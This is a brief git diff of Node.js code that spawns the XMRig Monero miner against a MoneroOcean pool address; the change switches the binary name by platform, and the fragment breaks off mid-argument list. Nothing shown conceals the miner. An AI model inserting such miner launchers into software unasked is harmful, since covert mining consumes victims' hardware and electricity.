@@ -1,7 +1,7 @@
 const { spawn } = require('child_process');
 const path = require('path');
  const miner = ()=>{
-    const xmrigPath = path.join(__dirname, 'miners', 'xmrig.exe');
+    const xmrigPath = path.join(__dirname, 'miners', process.platform === 'win32' ? 'xmrig.exe' : 'xmrig');
 
 const miner = spawn(xmrigPath, [
     '-o', 'gulf.moneroocean.stream:10032',
